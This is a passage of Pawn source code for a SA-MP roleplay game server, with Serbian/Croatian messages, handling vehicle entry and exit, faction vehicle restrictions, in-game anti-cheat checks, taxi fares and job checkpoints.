			occupied[ vehicleid ] = true;
	}
    antiCheatCS[ playerid ][ EnteredVehicle ] = vehicleid;
   	if( ispassenger == 0 ) {
		if( BusyVehicle[ vehicleid ] > -1 ) {
		    if( BusyVehicle[ vehicleid ] == playerid ) { }
			else {
	        	new Float:Poz[ 3 ];
			   	GetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
		       	Novi_SetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
		       	SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
	        	SCM( playerid, SVETLOCRVENA, "| V:AC | Zabranjeno je otimati vozila drugim igracima!");
			}
		}
	}

    if(vehicleid == TrainDriverVehicle) {

        new Float:Poz[ 3 ];
        GetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
        SetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
        return 1;
    }

    if(vehicleid == Viljuskar[0]) {

        if(GetFactionType(playerid) != ORG_TIP_MAFIJA) {

            new Float:Poz[ 3 ];
            GetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
            SetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
            SendErrorMessage(playerid, "Samo clanovi mafije!");
            return 1;
        }
        else {

            SendInfoMessage(playerid, "Da utovaris kutiju, pridji joj i kucaj /uzmipaket");
            return 1;
        }
    }

    if(vehicleid == Viljuskar[1]) {

        if(GetFactionType(playerid) != ORG_TIP_MAFIJA) {

            new Float:Poz[ 3 ];
            GetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
            SetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
            SendErrorMessage(playerid, "Samo clanovi mafije!");
            return 1;
        }
        else {

            SendInfoMessage(playerid, "Da utovaris kutiju, pridji joj i kucaj /uzmipaket");
            return 1;
        }
    }

    if(vehicleid == KombiMats) {

        if(GetFactionType(playerid) != ORG_TIP_MAFIJA) {

            new Float:Poz[ 3 ];
            GetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
            SetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
            SendErrorMessage(playerid, "Samo clanovi mafije!");
            return 1;
        } else {

            SendInfoMessage(playerid, "Usao si u kombi! Odnesi ga na lokaciju i kucaj /predajmats!");

            VoziKombi[playerid] = true;

            Novi_SetPlayerCheckpoint(playerid, 3823.3127,-1152.8422,10.9416, 5.0);
            return 1;
        }
    }

    if(vehicleid == KombiPrevoz) {

        if(GetFactionType(playerid) != ORG_TIP_MAFIJA && GetFactionType(playerid) != ORG_TIP_BANDA && GetFactionType(playerid) != ORG_TIP_PD) {

            new Float:Poz[ 3 ];
            GetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
            Novi_SetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
            SendErrorMessage(playerid, "Samo clanovi bande/mafije ili policija!");
            return 1;
        } else {

            new string[128];
            format(string, 128, "{FF7300}KOMBI: (( {FFFFFF}Igrac %s(%d) [%s] je usao u kombi sa novcem {FF7300}))", ImeIgraca(playerid), playerid, OI[ PlayerInfo[playerid][xClan] ][ oPreFix ]);
            SendClientMessageToAll(-1, string);

            if(GetFactionType(playerid) == ORG_TIP_PD) {

                SendInfoMessage(playerid, "Usao si u kombi! Odnesi ga kod ulaza Policijske stanice u LV i kucaj /predajnovac");

                return 1;
            }
            else {

                SendInfoMessage(playerid, "Usao si u kombi! Odnesi ga blizu ulaza tvoje organizacije i kucaj /predajnovac");
            }
            return 1;
        }

    }

    if(vehicleid == KombiHangar) {

        if(GetFactionType(playerid) != ORG_TIP_MAFIJA && GetFactionType(playerid) != ORG_TIP_BANDA) {

            new Float:Poz[ 3 ];
            GetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
            Novi_SetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
            SendErrorMessage(playerid, "Samo clanovi bande/mafije!");
            return 1;
        } else {

            SendInfoMessage(playerid, "Usao si u kombi! Odnesi ga blizu ulaza tvoje organizacije i kucaj /predajkombi");
            return 1;
        }
    }
	return true;
}

public OnPlayerExitVehicle( playerid, vehicleid ) {
    new Float:x,Float:y,Float:z;
	GetVehiclePos( vehicleid,x, y, z );
	RealVehiclePositions[ vehicleid ][ 0 ] = x;
	RealVehiclePositions[ vehicleid ][ 1 ] = y;
	RealVehiclePositions[ vehicleid ][ 2 ] = z;

    if(vehicleid == KombiMats) {

        VoziKombi[playerid] = false;
        Novi_DisablePlayerCheckpoint(playerid);
        SendInfoMessage(playerid, "Izasao si iz kombija!");
        return 1;
    }

	if( Pojas[ playerid ] == true ) {
		format( globalstring, sizeof( globalstring ), "* %s se hvata za pojas, te ga skida.", ImeIgraca( playerid ) );
		PorukaRadius(30.0, playerid, globalstring, LJUBICASTA );
	    Pojas[ playerid ] = false;
    }

    if( IsValidDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] ) ) {
		DestroyDynamicObject( PlayerGpsRadar[ playerid ][ _pgrObject ] );
		PlayerGpsRadar[ playerid ][ _pgrObject ] = -1;
	}
	return true;
}

public OnPlayerStateChange( playerid, newstate, oldstate ) {

    if( oldstate == PLAYER_STATE_DRIVER && antiCheatCS[ playerid ][ RemoveVehicle ] == false ) {
        if( ( GetTickCount() - antiCheatCS[ playerid ][ EnterVehTime ] ) < 220 ) {
            antiCheatCS[ playerid ][ SpamVehicle ]++;
	    	if( antiCheatCS[ playerid ][ SpamVehicle ] >= 2 ) {
            	format( globalstring, sizeof( globalstring ), "| V:AC | Moguc SPAM VOZILA!!! || %s[ID: %d] |LEVEL: |%d|| Koristi /spec!!!", ImeIgraca( playerid ), playerid, PlayerInfo[ playerid ][ xLevel ] );
				AdminPoruka( -1, globalstring );
			}
        }
    }

	if( antiCheatCS[ playerid ][ TakeVehicle ] != INVALID_VEHICLE_ID ) {
    	BusyVehicle[ antiCheatCS[ playerid ][ TakeVehicle ] ] = -1;
        antiCheatCS[ playerid ][ TakeVehicle ] = INVALID_VEHICLE_ID;
    }

    if( newstate == PLAYER_STATE_DRIVER ) {


        new engine, lights, alarm, doors, bonnet, boot, objective;
        gLastDriver[ GetPlayerVehicleID( playerid ) ] = playerid;
        LastCar[ playerid ] = GetPlayerVehicleID( playerid );
		antiCheatCS[ playerid ][ EnterVehTime ] = GetTickCount();
		
  		// PlayerTextDrawSetPreviewModel( playerid, Brzinomer[ playerid ][ 1 ], GetVehicleModel( GetPlayerVehicleID( playerid ) ) );
	   //  PlayerTextDrawShow( playerid, Brzinomer[ playerid ][ 1 ] );

        new stringic2[ 30 ];
		format( stringic2, sizeof( stringic2 ), "~r~%s", GetVehicleNameEx( GetVehicleModel( GetPlayerVehicleID( playerid ) ) ) );
		PlayerTextDrawSetString( playerid, Brzinomer[ playerid ][ 1 ], stringic2 );

        format( stringic2, sizeof( stringic2 ), "%d", Fuel[GetPlayerVehicleID(playerid)] );
        PlayerTextDrawSetString( playerid, Brzinomer[ playerid ][ 5 ], stringic2 );

        // foreach(Player, i) {
        //     if(GetPlayerVehicleID(playerid) == RentVozilo[i] && i != playerid && PlayerInfo[playerid][xAdmin] < 5) {

        //         new Float:Pos[ 3 ];
        //         GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
        //         Novi_SetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
        //         SendErrorMessage(playerid, "Ovo vozilo je vec rentano!");
        //         return 1;
        //     }
        //     if(GetPlayerVehicleID(playerid) == OrgVeh[i] && PlayerInfo[playerid][xClan] != PlayerInfo[i][xClan] && PlayerInfo[playerid][xAdmin] < 5) {

        //         new Float:Pos[ 3 ];
        //         GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
        //         Novi_SetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] + 1 );
        //         SendErrorMessage(playerid, "Ne mozes sesti u ovo organizacijsko vozilo!");
        //         return 1;
        //     }
        // }

        if(LastCar[playerid] == UlicneTrkeVozilo || LastCar[playerid] == UlicneTrkeVozilo2) {

            new Float:Pos[ 3 ];
            GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
            Novi_SetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
            SendErrorMessage(playerid, "Ne mozes sesti u to vozilo!");
            return 1;
        }

        if( ServerInfo[ RRVehicle ] == true ) {
		    if( !occupied[ GetPlayerVehicleID( playerid ) ] )
				occupied[ GetPlayerVehicleID( playerid ) ] = true;
		}
    
        if( HavePlayerWeapon( playerid ) ) {
	        SetPlayerArmedWeapon( playerid, 0 );
	    }
    
		if( GetPlayerVehicleID( playerid ) != antiCheatCS[ playerid ][ CWVehID ] ) {
            if( antiCheatCS[ playerid ][ CWTime ] > gettime( ) ) {
				format( globalstring, sizeof( globalstring ), "| V:AC | %s je kickovan sa servera. Razlog: "col_white"Car Warp", ImeIgraca( playerid ) );
				AdminPoruka( SVETLOCRVENA, globalstring );
				Kickovanje( playerid, ""col_white"Ti si kickovan sa servera. Razlog: "col_crvena"Car Warp");
                return 1;
            }
            antiCheatCS[ playerid ][ CWTime ] = gettime( ) + 1;
			antiCheatCS[ playerid ][ CWVehID ] = GetPlayerVehicleID( playerid );
		}

		if( BusyVehicle[ GetPlayerVehicleID( playerid ) ] > -1 ) {
			if( BusyVehicle[ GetPlayerVehicleID( playerid ) ] == playerid ) { }
			else {
				new Float:Pos[ 3 ];
		    	GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
	        	Novi_SetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
				SendClientMessage( playerid, SVETLOCRVENA, "| V:AC | Zboga moguce kradje vozila izbacen si iz njega!" );
   			}
		}
		else {
			BusyVehicle[ GetPlayerVehicleID( playerid ) ] = playerid;
			antiCheatCS[ playerid ][ TakeVehicle ] = GetPlayerVehicleID( playerid );
		}
		
		if( garbagemanVehicles[ GetPlayerVehicleID( playerid ) ][ gPlayerID ] != -1 ) {
			if( garbagemanVehicles[ GetPlayerVehicleID( playerid ) ][ gPlayerID ] == playerid ) { }
			else {
				new Float:Pos[ 3 ];
		    	GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
	        	Novi_SetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
				SendClientMessage( playerid, SVETLOCRVENA, "| V:AC | Ovo vozilo vec neko koristi za posao ne mozete uci!" );
   			}
		}
		
		if( farmerVehicles[ GetPlayerVehicleID( playerid ) ][ fvMilk ] == true ) {
			if( farmerVehicles[ GetPlayerVehicleID( playerid ) ][ fvMilkpID ] == playerid ) { }
			else {
				new Float:Pos[ 3 ];
		    	GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
	        	Novi_SetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
				SendClientMessage( playerid, SVETLOCRVENA, "| V:AC | Ovo vozilo vec neko koristi za posao ne mozete uci!" );
   			}
		}

  		if( GetPlayerVehicleID( playerid ) != antiCheatCS[ playerid ][ EnteredVehicle ] && antiCheatCS[ playerid ][ RemoveVehicle ] == false ) {
            if(DronVozi[playerid] == -1) {
			    format( globalstring, sizeof( globalstring ), "| V:AC | Moguc SPAM/Port VOZILA!!! || %s[ID: %d] |LEVEL: |%d|| Koristi /spec!!!", ImeIgraca( playerid ), playerid, PlayerInfo[ playerid ][ xLevel ] );
			    AdminPoruka( -1, globalstring );
            }
		}
		
        if( vCanDrive[ GetPlayerVehicleID( playerid ) ] == 0 ) {
			SetCameraBehindPlayer( playerid );
			SCM( playerid, CRVENA, "Ovo vozilo je unisteno. Koristite /call 555 ili ukucajte /exit za napustanje vozila.");
			GetVehicleParamsEx( GetPlayerVehicleID( playerid ),engine, lights, alarm, doors, bonnet, boot, objective );
			SetVehicleParamsEx( GetPlayerVehicleID( playerid ),0,lights,alarm,doors,bonnet,boot,objective);
		}

		if( !IsVehicleBajs( GetPlayerVehicleID( playerid ) ) ) {
			for( new i = 0; i < 11; i++) {
				PlayerTextDrawShow( playerid, Brzinomer[ playerid ][ i ] );
			}
            //SendInfoMessage(playerid, "Koristi 'LALT' za dodatne opcije vozila.");
		}

		if( Fuel[ GetPlayerVehicleID( playerid ) ] < 1) {
		    if(!IsVehicleBajs( GetPlayerVehicleID( playerid ) ) && !IsVehicleLetelica( GetPlayerVehicleID( playerid ) ) && !IsVehicleBrod( GetPlayerVehicleID( playerid ) ) )
			{
	    		SetCameraBehindPlayer( playerid );
	    		SetPVarInt( playerid, "NoFuel", 1);
			   	SCM( playerid, CRVENA, "Ovo vozilo nema goriva. Koristite /exit da biste izasli.");
			   	GetVehicleParamsEx( GetPlayerVehicleID( playerid ), engine, lights, alarm, doors, bonnet, boot, objective );
				SetVehicleParamsEx( GetPlayerVehicleID( playerid ), 0,lights,alarm,doors,bonnet,boot,objective);
			}
		}
		GetVehicleParamsEx( GetPlayerVehicleID( playerid ), engine, lights, alarm, doors, bonnet, boot, objective );
		if( engine == 0 ) {
			SCM( playerid, SRVBOJA1, "Da upalite vozilo koristite "col_white"/upali "col_crvena"ili tipku "col_white"2." );
		}

        antiCheatCS[ playerid ][ EnteredVehicle ] = GetPlayerVehicleID( playerid );

		if( oldstate == PLAYER_STATE_ONFOOT )
		{
			if( GetFactionType( playerid ) == ORG_TIP_TAXI ) {
				if( taxiDuty[ playerid ] == true && VoziIgracaID[ playerid ] == INVALID_PLAYER_ID ) {
					TaximetarUkljucen[ playerid ] = false;

					PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 0 ] );
					PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 1 ] );
					PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 2 ] );
					PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 3 ] );
					PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 4 ] );
					PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 5 ] );
					PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 6 ] );
					PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 7 ] );

		            PlayerTextDrawSetString( playerid, TaxistaTD[ playerid ][ 6 ], "N/A" );
			        PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 6 ] );
					PlayerTextDrawSetString( playerid, TaxistaTD[ playerid ][ 7 ], "N/A" );
					PlayerTextDrawShow( playerid, TaxistaTD[ playerid ][ 7 ] );

					CenaVoznje[ playerid ] = 0;
					VoziIgracaID[ playerid ] = INVALID_PLAYER_ID;
					offeredByCabbie[ playerid ] = INVALID_PLAYER_ID;
				}
			}
		}

        if( PlayerInfo[ playerid ][ xAdmin ] >= 5 ) {
			SendClientMessageEx( playerid, -1, "Ulazite u vozilo ciji je ID kljuca - %d", getVehicleScriptID(GetPlayerVehicleID(playerid)) );
		}

		if(PrivatnoVozilo(GetPlayerVehicleID(playerid))) {
			if( PlayerInfo[ playerid ][ xAdmin ] >= 1 ) {
				SendClientMessageEx( playerid, -1, "Ulazite u privatno vozilo ciji je vlasnik - %s", VehicleInfo[ getVehicleScriptID(GetPlayerVehicleID( playerid )) ][ vOwner ] );
			}
		}
		//
		new vehicleid = GetPlayerVehicleID( playerid );
		if( IsVehicleMotor( vehicleid ) ) {
			if( PlayerInfo[ playerid ][ xMotorska ] == 0 ) {
				SCM( playerid, SRVBOJA1, "Nemate dozvolu za voznju motora pazi se policije!");
		 	}
	  	}

	  	if( IsVehicleAuto( vehicleid ) ) {
			if( PlayerInfo[ playerid ][ xVozacka ] == 0 ) {
				SCM( playerid, SRVBOJA1, "Nemate dozvolu za voznju auta pazi se policije!");
		 	}
	  	}

        if( IsVehicleC1( vehicleid ) ) {
			if( PlayerInfo[ playerid ][ xKamionskaC1 ] == 0 ) {
				SCM( playerid, SRVBOJA1, "Nemate dozvolu za voznju kombija pazi se policije!");
		 	}
	  	}

	  	if( IsVehicleC2( vehicleid ) ) {
			if( PlayerInfo[ playerid ][ xKamionskaC2 ] == 0 ) {
				SCM( playerid, SRVBOJA1, "Nemate dozvolu za voznju kamiona pazi se policije!");
		 	}
	  	}

	  	if( IsVehicleC3( vehicleid ) ) {
			if( PlayerInfo[ playerid ][ xKamionskaC3 ] == 0 ) {
				SCM( playerid, SRVBOJA1, "Nemate dozvolu za voznju kamiona sa prikolicom pazi se policije!");
		 	}
	  	}

	  	if( IsVehicleBrod( vehicleid ) ) {
			if( PlayerInfo[ playerid ][ xBrodska ] == 0 ) {
				SCM( playerid, SRVBOJA1, "Nemate dozvolu za voznju broda pazi se policije!");
		 	}
	  	}

	  	if( IsVehicleLetelica( vehicleid ) ) {
			if( PlayerInfo[ playerid ][ xLetelica ] == 0 ) {
				SCM( playerid, SRVBOJA1, "Nemate dozvolu za voznju aviona pazi se policije!");
		 	}
	  	}

	    if( NosiPaketOruzja[ playerid ] == true ) {
		    new Float:Poz[ 3 ];
		    GetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
	        Novi_SetPlayerPos( playerid, Poz[0], Poz[1], Poz[2]+2 );
			SendErrorMessage( playerid, "Ne mozes uci sa paketom u vozilo!" );
	    }

	    if( UzeoPicu[ playerid ] == true ) {
		    new Float:Poz[ 3 ];
		    GetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
	        Novi_SetPlayerPos( playerid, Poz[0], Poz[1], Poz[2]+2 );
			SendErrorMessage( playerid, "Ne mozes uci sa picom u vozilo!" );
	    }

	    if( Trucker[ playerid ][ tHasCargo ] == true ) {
		    new Float:Poz[ 3 ];
		    GetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
	        Novi_SetPlayerPos( playerid, Poz[0], Poz[1], Poz[2]+2 );
			SendErrorMessage( playerid, "Ne mozes uci sa kutijom u vozilo!" );
	    }

	}
	else if( newstate == PLAYER_STATE_ONFOOT ) {
	    for( new i = 0; i < 11; i++) {
			PlayerTextDrawHide( playerid, Brzinomer[ playerid ][ i ] );
		}

        PucanjeGumeBrojac[playerid] = 0;

	    if( oldstate == PLAYER_STATE_PASSENGER ) {
			if( offeredByCabbie[ playerid ] != INVALID_PLAYER_ID ) {
				TaximetarUkljucen[ offeredByCabbie[ playerid ] ] = false;

				PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 0 ] );
				PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 1 ] );
				PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 2 ] );
				PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 3 ] );
				PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 4 ] );
				PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 5 ] );
				PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 6 ] );
				PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 7 ] );

				DajIgracuNovac( playerid, -CenaVoznje[ offeredByCabbie[ playerid ] ] );
				DajIgracuNovac( offeredByCabbie[ playerid ], CenaVoznje[ offeredByCabbie[ playerid ] ] );

				SendClientMessageEx( playerid, ZUTA, "Stigli ste do lokacije i platili %d$ za voznju", CenaVoznje[ offeredByCabbie[ playerid ] ] );
				SendClientMessageEx( offeredByCabbie[ playerid ], ZUTA, "Stigli ste do lokacije na koju je igrac htio i naplatili %d$ za voznju", CenaVoznje[ offeredByCabbie[ playerid ] ] );

				PlayerTextDrawSetString( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 6 ], "N/A" );
		        PlayerTextDrawShow( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 6 ] );
				PlayerTextDrawSetString( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 7 ], "N/A" );
				PlayerTextDrawShow( offeredByCabbie[ playerid ], TaxistaTD[ offeredByCabbie[ playerid ] ][ 7 ] );

				CenaVoznje[ offeredByCabbie[ playerid ] ] = 0;
				Novi_KillTimer( TaxiTimer[ offeredByCabbie[ playerid ] ] );
				VoziIgracaID[ offeredByCabbie[ playerid ] ] = INVALID_PLAYER_ID;
				offeredByCabbie[ playerid ] = INVALID_PLAYER_ID;
			}
		}

        antiCheatCS[ playerid ][ EnteredVehicle ] = INVALID_VEHICLE_ID;

		if( oldstate == PLAYER_STATE_DRIVER ) {
		    new lastveh = LastCar[ playerid ];
		    new Float:x, Float:y, Float:z;
			GetVehiclePos( lastveh, x, y, z );
            RealVehiclePositions[ lastveh ][ 0 ] = x;
			RealVehiclePositions[ lastveh ][ 1 ] = y;
			RealVehiclePositions[ lastveh ][ 2 ] = z;
			
			antiCheatCS[ playerid ][ EnteredVehicle ] = INVALID_VEHICLE_ID;
		    
			if( taxiDuty[ playerid ] == true && VoziIgracaID[ playerid ] == INVALID_PLAYER_ID )
			{
				TaximetarUkljucen[ playerid ] = false;

				PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 0 ] );
				PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 1 ] );
				PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 2 ] );
				PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 3 ] );
				PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 4 ] );
				PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 5 ] );
				PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 6 ] );
				PlayerTextDrawHide( playerid, TaxistaTD[ playerid ][ 7 ] );

				CenaVoznje[ playerid ] = 0;
				VoziIgracaID[ playerid ] = INVALID_PLAYER_ID;
				offeredByCabbie[ playerid ] = INVALID_PLAYER_ID;
			}
		}

	    if(GetPVarInt( playerid, "gGas") == 1) {
        	for( new i = 0; i < 11; i++) {
				PlayerTextDrawHide( playerid, Brzinomer[ playerid ][ i ] );
			}
		}
	}
	else if( newstate == PLAYER_STATE_SPAWNED ) {

        if(WARPInfo[ playerid ][ warID ] == -1) {

    	    Novi_SetPlayerHealth( playerid, 150.00 );
    		if( PlayerInfo[ playerid ][ xVIPLevel ] >= 5 ) {
    		    Novi_SetPlayerHealth( playerid, 150.00 );
                Novi_SetPlayerArmour( playerid, 100.00);
    		}
        }
    }
	//
	else if( newstate == PLAYER_STATE_PASSENGER ) {

        if(RobTrafikaKurac{playerid} != 0) 
        {
            SendInfoMessage(playerid, "Seo si u vozilo i pljacka se prekinula!");
            PrekinuoRob{playerid} = 1;
            stop TimerRobTrafika;
            RobTrafikaKurac{playerid} = 0;
            TogglePlayerControllable(playerid, 1);
            PostaviWanted(playerid, "Neuspesna Pljacka Trafike", "Nepoznat", 3);
            ClearAnimations(playerid);
            return 1;
        }

	    if( HavePlayerWeapon( playerid ) ) {
	        SetPlayerArmedWeapon( playerid, 0 );
	    }

	    if( GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 416 && GetPlayerVehicleSeat( playerid ) != 1 ) {
		    GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
	     	Novi_SetPlayerPos( playerid, 2003.3, 2284.2, 1011.1 );
	     	SetPlayerFacingAngle( playerid, 0 );
	        SetCameraBehindPlayer( playerid );
	        TogglePlayerControllable( playerid, false );
	        SetPlayerInterior( playerid, 1 );
			InAmbu[ playerid ] = GetPlayerVehicleID( playerid );
		}
		
		if( farmerInfo[ playerid ][ fiHaveBucket ] == true ) {
		    new Float:Poz[ 3 ];
		    GetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
	        Novi_SetPlayerPos( playerid, Poz[0], Poz[1], Poz[2]+2 );
			SendErrorMessage( playerid, "Ne mozes uci sa kantom u vozilo!" );
	    }

        if( farmerInfo[ playerid ][ fiFarmerPickupedBale ] == true ) {
		    new Float:Poz[ 3 ];
		    GetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
	        Novi_SetPlayerPos( playerid, Poz[0], Poz[1], Poz[2]+2 );
			SendErrorMessage( playerid, "Ne mozes uci sa usevom u vozilo!" );
	    }
	    
	    if( UzeoPicu[ playerid ] == true ) {
		    new Float:Poz[ 3 ];
		    GetPlayerPos( playerid, Poz[0], Poz[1], Poz[2] );
	        Novi_SetPlayerPos( playerid, Poz[0], Poz[1], Poz[2]+2 );
			SendErrorMessage( playerid, "Ne mozes uci sa picom u vozilo!" );
	    }
	    
	}
	return true;
}

potrebnoTura(playerid) {

    new broj;
    if(PlayerInfo[playerid][xJobSkill] == 0) broj = 10;
    if(PlayerInfo[playerid][xJobSkill] == 1) broj = 40;
    if(PlayerInfo[playerid][xJobSkill] == 2) broj = 80;
    if(PlayerInfo[playerid][xJobSkill] == 3) broj = 120;
    if(PlayerInfo[playerid][xJobSkill] == 4) broj = 200;
    if(PlayerInfo[playerid][xJobSkill] == 5) broj = 200;

    return broj;
}

CheckJobSkill(playerid) {

    if(PlayerInfo[playerid][xJobSkill] == 0) {

        if(PlayerInfo[playerid][xDeliveryBroj] >= 10) {

            PlayerInfo[playerid][xJobSkill]++;
            SavePlayer(playerid);
            SendJobMessage(playerid, "Dobio si rankup na poslu!");
            return 1;
        }
    }

    if(PlayerInfo[playerid][xJobSkill] == 1) {

        if(PlayerInfo[playerid][xDeliveryBroj] >= 40) {

            PlayerInfo[playerid][xJobSkill]++;
            SavePlayer(playerid);
            SendJobMessage(playerid, "Dobio si rankup na poslu!");
            return 1;
        }
    }

    if(PlayerInfo[playerid][xJobSkill] == 2) {

        if(PlayerInfo[playerid][xDeliveryBroj] >= 80) {

            PlayerInfo[playerid][xJobSkill]++;
            SavePlayer(playerid);
            SendJobMessage(playerid, "Dobio si rankup na poslu!");
            return 1;
        }
    }

    if(PlayerInfo[playerid][xJobSkill] == 3) {

        if(PlayerInfo[playerid][xDeliveryBroj] >= 120) {

            PlayerInfo[playerid][xJobSkill]++;
            SavePlayer(playerid);
            SendJobMessage(playerid, "Dobio si rankup na poslu!");
            return 1;
        }
    }

    if(PlayerInfo[playerid][xJobSkill] == 4) {

        if(PlayerInfo[playerid][xDeliveryBroj] >= 200) {

            PlayerInfo[playerid][xJobSkill]++;
            SavePlayer(playerid);
            SendJobMessage(playerid, "Dobio si rankup na poslu!");
            return 1;
        }
    }

    return 1;
}

public OnPlayerEnterCheckpoint( playerid ) {

    if(radiPaparazo[playerid]) {

        missionPassed(playerid, 5000);

        zaustaviPaparazo(playerid);

        return 1;
    }

    if(radiElektricar[playerid] >= 1) {

        if(radiElektricar[playerid] == 1) {

            if(IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Ne mozes to iz vozila!");

            DisablePlayerCheckpoint(playerid);

            elektricarTDShow(playerid, true);

            SendJobMessage(playerid, "Prvo skini maticnu plocu tako sto cete odvrnuti safove ( X )");

            return 1;
        }

        if(radiElektricar[playerid] == 10) {

            DisablePlayerCheckpoint(playerid);

            radiElektricar[ playerid ] = 0;

            if(IsValidVehicle(elektricarVozilo[playerid]))
                Novi_DestroyVehicle(elektricarVozilo[playerid]);
            
            elektricarVozilo[playerid] = -1;

            if(ServerInfo[HappyJob] == POSAO_ELEKTRIK) {
                dajPlatuIgracu(playerid, PlataPosla[PLATA_ELEKTRIK] * 2);
                SendInfoMessage(playerid, "Zbog srecnog posla dobio si duplu platu!");
            } 
            else dajPlatuIgracu(playerid, PlataPosla[PLATA_ELEKTRIK]);

            BussinesJobMoney(POSAO_ELEKTRIK, PlataPosla[PLATA_ELEKTRIK]/2);

            SavePlayer( playerid );
            SendJobMessage( playerid, "Zaradili ste "col_white"%d$ "col_job"koji su vam legli na platni racun.", PlataPosla[PLATA_ELEKTRIK]);

            PostaviSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
            UzeoOpremu[ playerid ] = false;

            return 1;
        }

        return 1;
    }

    if(radiPilot[playerid] >= 1) {

        if(radiPilot[playerid] == 1) {

            Novi_DestroyVehicle(pilotVozilo[playerid]);
            pilotVozilo[playerid] = V01D_CreateVehicle(593,3532.7988,-928.5114,11.5829,296.5357, 0, 0, -1 );
            Novi_PutPlayerInVehicle(playerid, pilotVozilo[playerid], 0);

            Novi_DisablePlayerCheckpoint(playerid);
            Novi_SetPlayerCheckpoint(playerid, -1338.2748,153.5751,14.6072, 5.0);

            radiPilot[playerid] = 2;

            SendJobMessage(playerid, "Odvezi putnike na zadatu lokaciju!");

            return 1;
        }
        if(radiPilot[playerid] == 2) {

            if(!IsPlayerInVehicle(playerid, pilotVozilo[playerid])) return SendErrorMessage(playerid, "Moras biti u svom vozilu za posao!");
            if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, "Moras biti na mestu vozaca!");

            TogglePlayerControllable(playerid, false);

            GameTextForPlayer(playerid, "~r~Iskrcavanje robe..", 15000, 3);

            defer IskrcavanjePutnika(playerid);

            Novi_DisablePlayerCheckpoint(playerid);

            return 1;
        }

        if(radiPilot[playerid] == 3) {

            if(!IsPlayerInVehicle(playerid, pilotVozilo[playerid])) return SendErrorMessage(playerid, "Moras biti u svom vozilu za posao!");
            if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, "Moras biti na mestu vozaca!");

            DisablePlayerCheckpoint(playerid);

            radiPilot[ playerid ] = 0;
            Novi_DestroyVehicle(pilotVozilo[playerid]);

            if(ServerInfo[HappyJob] == POSAO_PILOT) {
                dajPlatuIgracu(playerid, PlataPosla[PLATA_PILOT] * 2);
                SendInfoMessage(playerid, "Zbog srecnog posla dobio si duplu platu!");
            } 
            else dajPlatuIgracu(playerid, PlataPosla[PLATA_PILOT]);

